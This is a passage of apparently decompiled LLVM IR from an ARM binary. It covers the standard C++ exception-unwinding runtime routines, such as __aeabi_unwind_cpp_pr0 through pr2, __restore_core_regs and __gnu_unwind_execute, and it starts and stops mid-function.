  uselistorder i32 %v0_1834c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1830c, { 1, 0 }
  uselistorder i32 %v1_18308, { 1, 0 }
  uselistorder i32 %v0_18308, { 1, 0, 2 }
  uselistorder i32 %v4_182e0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18484, { 1, 2, 0 }
  uselistorder i32 %v0_182b8, { 1, 0 }
  uselistorder i32 %v3_182b4, { 1, 0, 2 }
  uselistorder i32 %v1_18288, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_184c0, { 1, 0 }
  uselistorder i1 %v2_182f4, { 1, 0, 2 }
  uselistorder i32 %v1_181f8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 24, 25, 26, 27, 28, 29, 30, 31, 32, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 14, 13, 15, 17, 16, 18, 27, 28, 29, 30, 31, 32, 33, 35, 34, 1, 19, 20, 21, 23, 22, 26, 24, 25, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 7, 8, 4, 6, 5, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 33, 17, 18, 29, 19, 30, 20, 31, 21, 32, 2, 34, 22, 35, 1, 5, 36, 37, 23, 38, 6, 39, 40, 41, 24, 42, 7, 43, 44, 45, 25, 46, 47, 48, 26, 49, 50, 51, 52, 8, 53, 54, 55, 56, 9, 57, 58, 59, 60, 61, 27, 62, 10, 63, 64, 65, 66, 67, 68, 28, 69, 11, 70, 71, 72, 73, 12, 74, 13, 14, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 7, 5, 6, 10, 11, 8, 9, 14, 15, 16, 3, 12, 4, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 149, 143, 148, 28, 29, 30, 31, 32, 33, 34, 35, 142, 36, 37, 38, 2, 39, 0, 3, 40, 41, 43, 42, 1, 46, 44, 45, 47, 145, 49, 48, 52, 53, 54, 50, 51, 55, 56, 58, 59, 60, 57, 61, 146, 62, 64, 63, 66, 65, 67, 147, 68, 70, 69, 72, 71, 77, 73, 78, 74, 79, 75, 76, 80, 81, 82, 83, 85, 86, 84, 141, 88, 87, 91, 92, 93, 89, 90, 94, 101, 95, 102, 96, 103, 97, 104, 98, 105, 99, 100, 107, 106, 108, 109, 110, 111, 116, 112, 117, 113, 118, 114, 115, 120, 119, 121, 122, 123, 126, 124, 127, 125, 128, 129, 130, 131, 132, 134, 135, 133, 136, 138, 139, 137, 140 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21694.308 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18648, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18564, { 1, 0 }
  uselistorder label %dec_label_pc_1852c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_184f0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1846c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_183ac, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_183a8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18308, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18264, { 1, 0 }
  uselistorder label %dec_label_pc_18264.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18264.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18704(i32 %arg1) local_unnamed_addr {
dec_label_pc_18704:
  %v0_18704 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18704, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18704
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18704, %bb
  %v10_1870c = phi i32 [ %arg1, %dec_label_pc_18704 ], [ 0, %bb ]
  ret i32 %v10_1870c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 28, 29, 30, 45, 23, 27, 46, 47, 48, 49, 50, 5, 4, 51, 42, 43, 31, 32, 24, 35, 34, 33, 36, 6, 8, 7, 20, 44, 25, 26, 12, 39, 19, 21, 22, 11, 10, 9, 13, 14, 15, 37, 16, 17, 18, 41, 38, 40, 52, 53 }
  uselistorder i1* @cpsr_z, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 36, 13, 14, 15, 32, 33, 34, 35, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18714 = load i32, i32* @r1, align 4
  %v2_18714 = load i32, i32* @r2, align 4
  %v4_18714 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18714, i32 %v2_18714, i32 2)
  ret i32 %v4_18714
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1871c = load i32, i32* @r1, align 4
  %v2_1871c = load i32, i32* @r2, align 4
  %v4_1871c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1871c, i32 %v2_1871c, i32 1)
  ret i32 %v4_1871c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18724 = load i32, i32* @r1, align 4
  %v2_18724 = load i32, i32* @r2, align 4
  %v4_18724 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_18724, i32 %v2_18724, i32 0)
  ret i32 %v4_18724

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 11, 12, 10, 59, 13, 0, 22, 14, 23, 60, 61, 62, 18, 19, 20, 21, 41, 42, 43, 44, 63, 64, 65, 79, 80, 81, 82, 1, 68, 69, 2, 70, 71, 3, 72, 66, 67, 35, 36, 4, 5, 6, 57, 58, 7, 8, 45, 46, 47, 73, 74, 75, 76, 77, 78, 37, 38, 39, 48, 49, 50, 56, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 40, 9, 51, 52, 53, 54, 55 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1872c = add i32 %tmp, 56
  %v4_1872c = inttoptr i32 %v3_1872c to i32*
  %v5_1872c = load i32, i32* %v4_1872c, align 4
  %v6_1872c = add i32 %tmp, 60
  %v7_1872c = inttoptr i32 %v6_1872c to i32*
  %v8_1872c = load i32, i32* %v7_1872c, align 4
  %v2_18738 = load i32, i32* %arg1, align 4
  %v3_18738 = add i32 %tmp, 4
  %v4_18738 = inttoptr i32 %v3_18738 to i32*
  %v5_18738 = load i32, i32* %v4_18738, align 4
  store i32 %v5_18738, i32* @r1, align 4
  %v12_18738 = add i32 %tmp, 16
  %v13_18738 = inttoptr i32 %v12_18738 to i32*
  %v14_18738 = load i32, i32* %v13_18738, align 4
  store i32 %v14_18738, i32* @r4, align 4
  %v15_18738 = add i32 %tmp, 20
  %v16_18738 = inttoptr i32 %v15_18738 to i32*
  %v17_18738 = load i32, i32* %v16_18738, align 4
  store i32 %v17_18738, i32* @r5, align 4
  %v18_18738 = add i32 %tmp, 24
  %v19_18738 = inttoptr i32 %v18_18738 to i32*
  %v20_18738 = load i32, i32* %v19_18738, align 4
  store i32 %v20_18738, i32* @r6, align 4
  %v21_18738 = add i32 %tmp, 28
  %v22_18738 = inttoptr i32 %v21_18738 to i32*
  %v23_18738 = load i32, i32* %v22_18738, align 4
  store i32 %v23_18738, i32* @r7, align 4
  %v24_18738 = add i32 %tmp, 32
  %v25_18738 = inttoptr i32 %v24_18738 to i32*
  %v26_18738 = load i32, i32* %v25_18738, align 4
  store i32 %v26_18738, i32* @r8, align 4
  %v27_18738 = add i32 %tmp, 36
  %v28_18738 = inttoptr i32 %v27_18738 to i32*
  %v29_18738 = load i32, i32* %v28_18738, align 4
  store i32 %v29_18738, i32* @sb, align 4
  %v30_18738 = add i32 %tmp, 40
  %v31_18738 = inttoptr i32 %v30_18738 to i32*
  %v32_18738 = load i32, i32* %v31_18738, align 4
  store i32 %v32_18738, i32* @sl, align 4
  store i32 %v8_1872c, i32* @ip, align 4
  store i32 %v5_1872c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1872c)
  ret i32 %v2_18738

; uselistorder directives
  uselistorder i32 %v8_1872c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 43, 44, 45, 46, 13, 14, 5, 0, 49, 6, 7, 47, 48, 11, 12, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 1, 83, 84, 85, 86, 87, 88, 89, 90, 91, 8, 92, 93, 33, 34, 2, 37, 38, 39, 40, 41, 42, 9, 35, 17, 10, 36, 20, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 10, 15, 16, 17, 5, 18, 19, 0, 20, 22, 21, 23, 1, 24, 26, 25, 27 }
  uselistorder i32* @sb, { 119, 120, 121, 9, 10, 11, 12, 101, 102, 103, 104, 105, 106, 107, 108, 109, 112, 110, 111, 113, 85, 86, 59, 60, 13, 14, 15, 16, 17, 18, 19, 6, 3, 0, 1, 2, 4, 5, 7, 8, 21, 20, 26, 27, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 114, 115, 116, 117, 118 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 268, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 1, 267, 0, 34, 269, 10, 270, 35, 36, 37, 38, 21, 22, 23, 24, 25, 26, 27, 28, 29, 3, 30, 31, 32, 33, 39, 40, 41, 42, 11, 271, 12, 18, 19, 4, 20, 203, 204, 5, 205, 206, 207, 231, 232, 233, 234, 235, 9, 236, 237, 238, 239, 240, 241, 242, 243, 179, 180, 181, 182, 193, 194, 195, 196, 197, 13, 136, 137, 138, 139, 43, 44, 45, 46, 14, 15, 91, 92, 93, 94, 95, 47, 48, 49, 50, 96, 97, 98, 99, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 17, 16, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 81, 78, 79, 80, 82, 83, 6, 84, 85, 86, 87, 88, 89, 90, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 7, 158, 159, 160, 161, 162, 163, 164, 165, 8, 166, 167, 168, 169, 170, 171, 2, 172, 173, 174, 175, 176, 177, 178, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 198, 199, 200, 201, 202, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 244, 245, 246, 247, 248, 249 }
  uselistorder i32 32, { 83, 80, 81, 82, 47, 84, 85, 43, 53, 86, 42, 77, 48, 44, 62, 60, 61, 57, 58, 59, 69, 70, 63, 64, 55, 56, 67, 68, 49, 75, 76, 78, 2, 3, 5, 4, 79, 7, 6, 9, 8, 11, 10, 45, 50, 46, 71, 13, 12, 15, 14, 17, 16, 19, 18, 54, 21, 20, 22, 24, 23, 25, 26, 28, 27, 65, 66, 72, 29, 30, 51, 31, 32, 33, 52, 34, 0, 35, 1, 36, 73, 37, 74, 38, 39, 40, 41 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 93, 92, 94, 8, 9, 95, 0, 56, 57, 58, 59, 60, 61, 54, 55, 10, 62, 63, 72, 73, 64, 65, 7, 11, 91, 86, 87, 88, 1, 74, 75, 76, 36, 37, 66, 67, 51, 46, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50, 52, 53, 68, 69, 70, 71, 12, 13, 14, 15, 16, 2, 17, 18, 19, 3, 20, 21, 4, 22, 23, 24, 25, 26, 27, 5, 77, 28, 78, 79, 80, 81, 29, 30, 6, 82, 31, 83, 32, 33, 34, 84, 85, 89, 35, 90 }
  uselistorder i32 20, { 125, 123, 124, 126, 1, 4, 9, 33, 127, 29, 128, 129, 130, 131, 5, 132, 133, 2, 134, 34, 10, 30, 31, 32, 35, 36, 37, 47, 48, 38, 39, 135, 116, 117, 118, 119, 120, 121, 122, 11, 112, 113, 114, 3, 49, 12, 50, 51, 0, 28, 41, 6, 43, 13, 44, 27, 42, 40, 45, 46, 52, 53, 14, 54, 55, 56, 57, 58, 59, 60, 61, 15, 62, 63, 64, 65, 66, 67, 16, 68, 69, 17, 70, 71, 72, 73, 18, 74, 75, 19, 76, 77, 78, 79, 80, 20, 81, 82, 83, 84, 85, 86, 21, 87, 88, 89, 90, 22, 23, 91, 7, 92, 24, 93, 94, 95, 96, 8, 97, 25, 98, 99, 100, 101, 102, 26, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115 }
  uselistorder i32* @r1, { 173, 17, 18, 16, 4, 174, 175, 63, 64, 80, 43, 2, 177, 44, 176, 156, 45, 46, 47, 19, 65, 1, 66, 67, 20, 180, 21, 5, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 6, 198, 199, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 69, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 3, 79, 26, 163, 108, 109, 200, 22, 202, 203, 204, 205, 131, 132, 29, 82, 30, 201, 23, 31, 164, 165, 166, 167, 168, 169, 170, 171, 172, 42, 100, 101, 158, 7, 154, 155, 8, 159, 162, 160, 9, 161, 83, 84, 24, 152, 85, 153, 157, 133, 134, 12, 32, 33, 34, 35, 36, 37, 38, 10, 208, 209, 210, 211, 0, 212, 25, 81, 110, 127, 206, 207, 178, 179, 27, 13, 86, 111, 112, 113, 114, 115, 28, 135, 136, 87, 88, 39, 40, 41, 89, 90, 91, 93, 94, 92, 137, 95, 96, 97, 98, 99, 102, 103, 104, 14, 105, 106, 107, 116, 117, 118, 15, 119, 148, 149, 11, 120, 121, 122, 123, 124, 125, 126, 128, 129, 130, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 150, 151 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18748 = load i32, i32* @r0, align 4
  ret i32 %v1_18748
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18750 = load i32, i32* @r0, align 4
  ret i32 %v1_18750
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18764 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18768 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18764, i32 0)
  ret i32 %v2_18768

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18788 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1878c = call i32 @__gnu_Unwind_Resume(i32 %v2_18788, i32 0)
  ret i32 %v2_1878c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_187ac = ptrtoint i32* %stack_var_-68 to i32
  %v2_187b0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_187ac, i32 0)
  ret i32 %v2_187b0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_187d0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_187d4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_187d0, i32 %arg2, i8* %arg3, i32 %v2_187d0)
  ret i32 %v6_187d4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18800 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18808 = add i32 %tmp1, 76
  %v2_18808 = inttoptr i32 %v1_18808 to i32*
  %v3_18808 = load i32, i32* %v2_18808, align 4
  %v1_1880c = add i32 %v3_18808, 7
  %v2_1880c = inttoptr i32 %v1_1880c to i8*
  %v3_1880c = load i8, i8* %v2_1880c, align 1
  %v4_1880c = zext i8 %v3_1880c to i32
  %v1_18810 = add i32 %v3_18808, 8
  %v3_18814 = mul nuw nsw i32 %v4_1880c, 4
  %v2_18818 = add i32 %v3_18814, %v1_18810
  %v3_18818 = inttoptr i32 %v2_18818 to i8*
  ret i8* %v3_18818
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18828 = load i32, i32* @r6, align 4
  %v21_18828 = load i32, i32* @lr, align 4
  %v0_1882c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1882c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1883c

dec_label_pc_1883c:                               ; preds = %dec_label_pc_1883c.backedge, %entry
  %v3_18848 = phi i32 [ %v0_1883c.pre, %dec_label_pc_1883c.backedge ], [ %tmp, %entry ]
  %v1_1883c = add i32 %v3_18848, 8
  %v2_1883c = inttoptr i32 %v1_1883c to i8*
  %v3_1883c = load i8, i8* %v2_1883c, align 1
  %v4_1883c = zext i8 %v3_1883c to i32
  store i32 %v4_1883c, i32* %r3.global-to-local, align 4
  %v2_18840 = icmp eq i8 %v3_1883c, 0
  store i1 %v2_18840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18840, label %dec_label_pc_18850, label %.thread

.thread:                                          ; preds = %dec_label_pc_1883c
  %v2_18844 = add nsw i32 %v4_1883c, -1
  store i32 %v2_18844, i32* %r3.global-to-local, align 4
  %v2_18848 = trunc i32 %v2_18844 to i8
  store i8 %v2_18848, i8* %v2_1883c, align 1
  %v0_1884c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1884c.pr.pr, label %.thread.dec_label_pc_18850_crit_edge, label %dec_label_pc_18878

.thread.dec_label_pc_18850_crit_edge:             ; preds = %.thread
  %v0_18850.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18850

dec_label_pc_18850:                               ; preds = %.thread.dec_label_pc_18850_crit_edge, %dec_label_pc_1883c
  %v0_18850 = phi i32 [ %v0_18850.pre, %.thread.dec_label_pc_18850_crit_edge ], [ %v3_18848, %dec_label_pc_1883c ]
  %v1_18850 = add i32 %v0_18850, 9
  %v2_18850 = inttoptr i32 %v1_18850 to i8*
  %v3_18850 = load i8, i8* %v2_18850, align 1
  %v4_18850 = zext i8 %v3_18850 to i32
  store i32 %v4_18850, i32* %r3.global-to-local, align 4
  %v2_18854 = icmp eq i8 %v3_18850, 0
  store i1 %v2_18854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18854, label %dec_label_pc_18958, label %dec_label_pc_1885c

dec_label_pc_1885c:                               ; preds = %dec_label_pc_1894c, %dec_label_pc_18850
  %v2_18860 = phi i32 [ %v0_1894c, %dec_label_pc_1894c ], [ %v0_18850, %dec_label_pc_18850 ]
  %v0_1885c = phi i32 [ %v4_1894c, %dec_label_pc_1894c ], [ %v4_18850, %dec_label_pc_18850 ]
  %v1_1885c = add nsw i32 %v0_1885c, -1
  store i32 %v1_1885c, i32* %r3.global-to-local, align 4
  %v1_18860 = trunc i32 %v1_1885c to i8
  %v3_18860 = add i32 %v2_18860, 9
  %v4_18860 = inttoptr i32 %v3_18860 to i8*
  store i8 %v1_18860, i8* %v4_18860, align 1
  %v0_18864 = load i32, i32* @r5, align 4
  %v1_18864 = add i32 %v0_18864, 4
  %v2_18864 = inttoptr i32 %v1_18864 to i32*
  %v3_18864 = load i32, i32* %v2_18864, align 4
  store i32 %v3_18864, i32* %r2.global-to-local, align 4
  %v1_18868 = inttoptr i32 %v3_18864 to i32*
  %v2_18868 = load i32, i32* %v1_18868, align 4
  store i32 %v2_18868, i32* %r0.global-to-local, align 4
  %v4_18868 = add i32 %v3_18864, 4
  store i32 %v4_18868, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18870 = inttoptr i32 %v0_18864 to i32*
  store i32 %v2_18868, i32* %v1_18870, align 4
  %v5_18870 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18870, i32* %v2_18864, align 4
  %v0_18874 = load i32, i32* %r3.global-to-local, align 4
  %v1_18874 = trunc i32 %v0_18874 to i8
  %v2_18874 = load i32, i32* @r5, align 4
  %v3_18874 = add i32 %v2_18874, 8
  %v4_18874 = inttoptr i32 %v3_18874 to i8*
  store i8 %v1_18874, i8* %v4_18874, align 1
  br label %dec_label_pc_18878

dec_label_pc_18878:                               ; preds = %.thread, %dec_label_pc_1885c, %.thread6
  %v0_18878 = load i32, i32* @r5, align 4
  %v1_18878 = inttoptr i32 %v0_18878 to i32*
  %v2_18878 = load i32, i32* %v1_18878, align 4
  %v3_1887c = udiv i32 %v2_18878, 16777216
  store i32 %v3_1887c, i32* @r4, align 4
  store i32 %v3_1887c, i32* %ip.global-to-local, align 4
  %v3_18884 = mul i32 %v2_18878, 256
  store i32 %v3_18884, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18878, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18884, i32* %v1_18878, align 4
  br i1 %tmp183, label %dec_label_pc_18958, label %dec_label_pc_18894

dec_label_pc_18894:                               ; preds = %dec_label_pc_18878
  %v0_18894 = load i32, i32* @r4, align 4
  %v1_18894 = and i32 %v0_18894, 128
  store i32 %v1_18894, i32* %r1.global-to-local, align 4
  %v2_18894 = icmp eq i32 %v1_18894, 0
  store i1 %v2_18894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18894, label %dec_label_pc_18970, label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %dec_label_pc_18894
  %v1_1889c = and i32 %v0_18894, 240
  store i32 %v1_1889c, i32* @r6, align 4
  %v7_188a0 = icmp eq i32 %v1_1889c, 128
  store i1 %v7_188a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188a0, label %dec_label_pc_188a8, label %dec_label_pc_189cc

dec_label_pc_188a8:                               ; preds = %dec_label_pc_1889c
  %v0_188a8 = load i32, i32* @r5, align 4
  %v1_188a8 = add i32 %v0_188a8, 8
  %v2_188a8 = inttoptr i32 %v1_188a8 to i8*
  %v3_188a8 = load i8, i8* %v2_188a8, align 1
  %v4_188a8 = zext i8 %v3_188a8 to i32
  store i32 %v4_188a8, i32* %r3.global-to-local, align 4
  %v2_188ac = icmp eq i8 %v3_188a8, 0
  store i1 %v2_188ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188ac, label %dec_label_pc_188bc, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_188a8
  %v2_188b0 = add nsw i32 %v4_188a8, -1
  store i32 %v2_188b0, i32* %r3.global-to-local, align 4
  %v2_188b4 = trunc i32 %v2_188b0 to i8
  store i8 %v2_188b4, i8* %v2_188a8, align 1
  %v0_188b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188b8.pr.pr, label %.thread3.dec_label_pc_188bc_crit_edge, label %dec_label_pc_188ec

